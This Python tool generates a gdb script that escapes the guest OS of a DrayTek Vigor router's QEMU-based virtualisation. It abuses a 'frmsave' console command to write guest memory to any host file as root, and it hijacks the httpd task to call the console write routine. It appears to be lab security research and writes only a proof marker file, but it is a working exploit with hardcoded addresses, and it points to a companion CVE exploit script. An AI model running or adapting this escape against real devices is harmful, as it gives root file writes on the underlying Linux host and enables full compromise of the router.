#!/usr/bin/env python3
"""Generate the gdb script that walks DrayOS out of the VM.

DrayTek's QEMU (hw/char/virtio-console.c, flush_buf) sniffs the bytes the
*guest* writes to its console port. A write beginning "frmsave " is parsed as

    frmsave <addr> <size> <host path>\\n

and handed to qmp_memsave(), which dumps guest memory to that host file. The
path is copied verbatim out of the guest's bytes -- no allowlist, no
canonicalisation, not confined to QEMU's cwd -- and QEMU runs as root both in
this lab and on the real device. Any code execution inside DrayOS is therefore
root on the Linux underneath.

This emits a script that stages a payload plus the command in unused httpd
task stack, then borrows the httpd task to call virtcons_out(buf, len). It is
the post-exploitation step: it stands in for the code execution a memory-
corruption bug would give you, so the escape can be measured on its own.

    python3 gen-frmsave.py --out escape.gdb --pokes pokes.gdb \\
        --path /tmp/vigor-escape-proof.txt

Then, with the guest running and a gdb stub on :1234:

    gdb-multiarch -batch -x escape.gdb
"""
import argparse
import struct

VIRTCONS_OUT = 0x40422E20   # named by its own error strings
GETCGI       = 0x40BBFA30   # a hardware breakpoint here lands us in httpd_main
LANDING      = 0x40000000   # reset vector: never executed, so it traps cleanly

# Unused httpd task stack. The task stack is 0x461ea800..0x461fa7f0 and the
# live region starts around 0x461f6510, so this page is free.
SCRATCH = 0x461EB000
CMDBUF  = 0x461EB200


def pokes(addr, blob):
    """gdb `set` lines writing blob into guest memory, 4 bytes at a time.

    Writing a string with `set {char[N]}` is fragile across gdb versions, and
    generating the script on a Windows host mangles backslash escapes. Whole
    words of hex avoid both.
    """
    out = []
    blob = blob + b"\x00" * ((-len(blob)) % 4)
    for i in range(0, len(blob), 4):
        out.append("set *(unsigned int*)0x%08x = 0x%08x"
                   % (addr + i, struct.unpack_from("<I", blob, i)[0]))
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", default="escape.gdb")
    ap.add_argument("--pokes", default="pokes.gdb")
    ap.add_argument("--symbols", default="/home/kali/out/sohod64.symbols.elf")
    ap.add_argument("--path", default="/tmp/vigor-escape-proof.txt",
                    help="host file to create (absolute paths work)")
    ap.add_argument("--marker", default="VIGOR-GUEST-ESCAPE-PROOF\n",
                    help="guest bytes to write into it")
    a = ap.parse_args()

    marker = a.marker.encode()
    cmd = ("frmsave %d %d %s\n" % (SCRATCH, len(marker), a.path)).encode() + b"\x00"

    lines = pokes(SCRATCH, marker) + pokes(CMDBUF, cmd)
    lines.append("set $cmdaddr = 0x%08x" % CMDBUF)
    lines.append("set $cmdlen  = %d" % (len(cmd) - 1))
    with open(a.pokes, "w", newline="\n") as fh:
        fh.write("\n".join(lines) + "\n")

    # Hardware breakpoints only. A software breakpoint is a patched instruction
    # in guest memory; if gdb is killed while the target runs, the patch stays,
    # a later gdb cannot remove a trap it never set, and DrayOS eventually
    # faults on it -- indistinguishable from a crash your payload caused.
    script = """set pagination off
set confirm off
set architecture aarch64
file {sym}
target remote :1234
shell sleep 1
hbreak *{getcgi:#x}
continue
delete breakpoints
printf "  borrowed httpd task at pc=0x%08x\\n", $pc
set $o_pc = $pc
set $o_x0 = $x0
set $o_x1 = $x1
set $o_lr = $x30
source {pokes}
printf "  staged: %s\\n", (char *)$cmdaddr
hbreak *{landing:#x}
set $x0 = $cmdaddr
set $x1 = $cmdlen
set $x30 = {landing:#x}
set $pc = {vco:#x}
printf "  calling virtcons_out(0x%08x, %d)\\n", $x0, $x1
continue
printf "  returned; restoring the task so the router keeps serving\\n"
delete breakpoints
set $pc = $o_pc
set $x0 = $o_x0
set $x1 = $o_x1
set $x30 = $o_lr
detach
quit
""".format(sym=a.symbols, getcgi=GETCGI, pokes=a.pokes,
           landing=LANDING, vco=VIRTCONS_OUT)
    with open(a.out, "w", newline="\n") as fh:
        fh.write(script)

    print("wrote %s and %s" % (a.out, a.pokes))
    print("  command: %s" % cmd[:-1].decode().rstrip("\n"))
    print("  send any request to the guest once gdb is waiting, e.g.")
    print("    python3 ../cve-2024-41592/qs.py 5")


if __name__ == "__main__":
    main()
